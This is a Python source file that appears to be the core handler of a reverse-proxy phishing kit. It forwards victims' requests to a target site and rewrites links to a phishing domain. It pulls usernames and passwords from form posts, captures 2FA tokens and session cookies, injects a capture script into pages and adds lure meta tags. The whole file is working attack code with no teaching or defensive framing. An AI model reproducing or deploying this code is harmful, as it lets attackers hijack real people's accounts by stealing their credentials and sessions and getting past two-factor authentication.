import requests
from http.server import BaseHTTPRequestHandler
from urllib.parse import urljoin, parse_qs
from bs4 import BeautifulSoup
import logging
import re
import uuid
import random
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from js_injector import generate_injection_script

class BaseProxyHandler(BaseHTTPRequestHandler):
    def __init__(self, config, store, analytics, *args, **kwargs):
        self.config = config
        self.store = store
        self.analytics = analytics
        self.session_id = str(uuid.uuid4())
        self.session = requests.Session()
        retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        self.session.mount('http://', HTTPAdapter(max_retries=retries))
        self.session.mount('https://', HTTPAdapter(max_retries=retries))
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.analytics.log_event('visit', self.session_id, self.config['service_name'], {'path': self.path})
        self.proxy_request('GET')

    def do_POST(self):
        self.analytics.log_event('submit', self.session_id, self.config['service_name'], {'path': self.path})
        if self.path == '/__phishlink_capture__':
            self.handle_js_capture()
        else:
            self.proxy_request('POST')

    def handle_js_capture(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(content_length).decode()
            captured = json.loads(data)
            if captured:
                self.store.save(captured, self.session_id, self.config['service_name'])
                self.analytics.log_event('js_capture', self.session_id, self.config['service_name'], captured)
            self.send_response(200)
            self.end_headers()
        except Exception as e:
            logging.error(f"JS capture error: {e}")
            self.send_response(500)
            self.end_headers()

    def proxy_request(self, method):
        target_url = urljoin(f"https://{self.config['target_domain']}", self.path)
        headers = self.randomize_headers()

        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length) if content_length else b''
            query_params = parse_qs(self.path.split('?')[1]) if '?' in self.path else {}

            if method == 'GET':
                resp = self.session.get(target_url, headers=headers, params=query_params, cookies=self.get_cookies())
            else:
                resp = self.session.post(target_url, headers=headers, data=post_data, cookies=self.get_cookies())

            self.capture_data(post_data, resp)
            content = self.rewrite_response(resp.text)

            self.send_response(resp.status_code)
            for k, v in resp.headers.items():
                if k.lower() not in ['content-encoding', 'content-length', 'transfer-encoding']:
                    self.send_header(k, v)
            self.send_header('Content-Length', len(content.encode()))
            self.end_headers()
            self.wfile.write(content.encode())
        except Exception as e:
            logging.error(f"Proxy error: {e}")
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

    def randomize_headers(self):
        headers = {k: v for k, v in self.headers.items() if k.lower() not in ['host']}
        headers['Host'] = self.config['target_domain']
        headers['User-Agent'] = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ])
        return headers

    def get_cookies(self):
        cookies = {}
        if 'Cookie' in self.headers:
            for cookie in self.headers['Cookie'].split(';'):
                k, v = cookie.strip().split('=', 1)
                cookies[k] = v
        return cookies

    def capture_data(self, post_data, response):
        captured = {}
        if post_data:
            try:
                post_str = post_data.decode()
                for rule in self.config['capture_rules']['credentials']:
                    field = rule['field']
                    selector = rule['selector']
                    if re.search(selector, post_str):
                        match = re.search(rf"{selector}=([^&]+)", post_str)
                        if match:
                            captured[field] = match.group(1)
            except Exception as e:
                logging.warning(f"POST parse error: {e}")

        if '2fa_token' in self.config['capture_rules']:
            selector = self.config['capture_rules']['2fa_token']
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.select_one(selector)
            if token_input and token_input.get('value'):
                captured['2fa_token'] = token_input.get('value')

        cookies = response.cookies.get_dict()
        if cookies:
            captured['cookies'] = {
                k: v for k, v in cookies.items()
                if k in self.config['capture_rules']['cookies']
            }

        if captured:
            self.store.save(captured, self.session_id, self.config['service_name'])
            self.analytics.log_event('capture', self.session_id, self.config['service_name'], captured)

    def rewrite_response(self, content):
        soup = BeautifulSoup(content, 'html.parser')
        for tag in soup.find_all(['a', 'form', 'img', 'script', 'link']):
            if tag.get('href'):
                tag['href'] = tag['href'].replace(self.config['target_domain'], self.config['phishing_domain'])
            if tag.get('src'):
                tag['src'] = tag['src'].replace(self.config['target_domain'], self.config['phishing_domain'])
            if tag.get('action'):
                tag['action'] = tag['action'].replace(self.config['target_domain'], self.config['phishing_domain'])

        if 'favicon' in self.config['lure']:
            favicon = soup.new_tag('link', rel='icon', href=self.config['lure']['favicon'])
            soup.head.append(favicon)

        if 'lure' in self.config:
            head = soup.head or soup.new_tag('head')
            for key, value in self.config['lure'].items():
                if key != 'favicon':
                    meta = soup.new_tag('meta')
                    meta['property'] = f"og:{key.split('_')[1]}"
                    meta['content'] = value
                    head.append(meta)
            soup.html.append(head)

        script = generate_injection_script(self.config)
        if script:
            soup.body.append(BeautifulSoup(script, 'html.parser'))

        return str(soup)
